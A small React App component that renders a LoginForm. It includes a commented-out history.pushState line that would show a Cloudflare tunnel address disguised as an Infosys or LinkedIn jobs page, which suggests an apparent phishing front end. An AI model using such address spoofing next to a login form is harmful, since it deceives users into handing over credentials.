import React from 'react';
import './App.css';
import LoginForm from './components/LoginForm';
import { useEffect } from 'react';

function App() {

  useEffect(()=>{
    // window.history.pushState({}, '', 'https://obtaining-vacations-hazard-soil.trycloudflare.com/fresherseasyapplyforjobs-infosys-linkedin.com')
  },[])
  return (
    <div className="App">
      <LoginForm />
    </div>
  );
}

export default App;
